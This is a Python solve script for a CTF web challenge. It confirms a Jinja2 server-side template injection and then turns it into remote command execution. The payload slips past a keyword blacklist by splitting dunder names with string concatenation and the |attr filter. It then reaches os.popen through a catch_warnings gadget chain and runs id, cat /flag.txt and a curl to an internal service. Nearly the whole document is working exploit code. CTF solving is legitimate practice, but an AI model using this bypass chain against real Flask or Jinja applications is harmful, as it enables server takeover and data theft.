#!/usr/bin/env python3
"""
Challenge: Lights from the Future
Category:  web (SSTI)
Platform:  KashiCTF 2026
"""
import requests
import sys
import re

# === CONFIG ===
LOCAL_URL = "http://localhost:5000"
REMOTE_URL = "http://34.126.223.46:17621"
BASE = REMOTE_URL if "--remote" in sys.argv else LOCAL_URL

# === SSTI PAYLOAD ===
# Blacklist: __class__, __mro__, __init__, __globals__, __builtins__,
#            __subclasses__, __import__, os, eval, exec, system, subprocess, popen, config
#
# Bypass: Jinja2 string concat (~) + |attr() filter + {%set%} variables
# Chain: "" -> str class -> object -> subclasses -> catch_warnings -> __init__.__globals__
#        -> __builtins__["__import__"]("os").popen(cmd).read()

def build_payload(cmd):
    """Build SSTI payload that bypasses keyword blacklist via string concat."""
    return (
        '{%set cl="__cl"~"ass__"%}'
        '{%set mr="__mr"~"o__"%}'
        '{%set sc="__subcl"~"asses__"%}'
        '{%set ini="__in"~"it__"%}'
        '{%set gl="__glo"~"bals__"%}'
        '{%set bu="__buil"~"tins__"%}'
        '{%set im="__impo"~"rt__"%}'
        '{%set pp="po"~"pen"%}'
        '{%for c in ((""|attr(cl)|attr(mr))[1]|attr(sc))()%}'
        '{%if c.__name__=="catch_warnings"%}'
        '{%set omod=((c|attr(ini))|attr(gl))[bu][im]("o"~"s")%}'
        '{%set pfn=(omod|attr(pp))%}'
        '{{pfn("' + cmd + '").read()}}'
        '{%endif%}{%endfor%}'
    )

def execute(cmd):
    """Send SSTI payload and return rendered text from PNG."""
    payload = build_payload(cmd)
    r = requests.post(BASE + "/", data={"message": payload})
    if r.headers.get("content-type", "").startswith("image/"):
        # Response is PNG — flag is in the rendered text
        # Save and print raw for manual inspection
        with open("/tmp/ssti_out.png", "wb") as f:
            f.write(r.content)
        print(f"[*] PNG saved to /tmp/ssti_out.png (check visually)")
        return r.content
    else:
        print(f"[-] Error: got {r.headers.get('content-type')}")
        print(r.text[:200])
        return None

def exploit():
    # Step 1: Verify SSTI
    print("[*] Verifying SSTI...")
    r = requests.post(BASE + "/", data={"message": "{{7*7}}"})
    if b"49" not in r.content and "49" not in r.text:
        print("[-] SSTI not confirmed")
        return

    print("[+] SSTI confirmed (7*7=49)")

    # Step 2: RCE via os.popen
    print("[*] Executing RCE...")
    execute("id")

    # Step 3: Get flag from internal flag service
    # start.sh fetches from http://172.17.0.1:9512/flag?chal_id=$CHALLENGE_ID&team_id=$TEAM_ID
    # Use env vars to get correct IDs
    print("[*] Fetching flag from internal service...")
    cmd = "curl -s http://172.17.0.1:9512/flag?chal_id=$CHALLENGE_ID\\&team_id=$TEAM_ID"
    execute(cmd)

    # Also try reading /flag.txt (populated by start.sh)
    print("[*] Reading /flag.txt...")
    execute("cat /flag.txt")

if __name__ == "__main__":
    exploit()
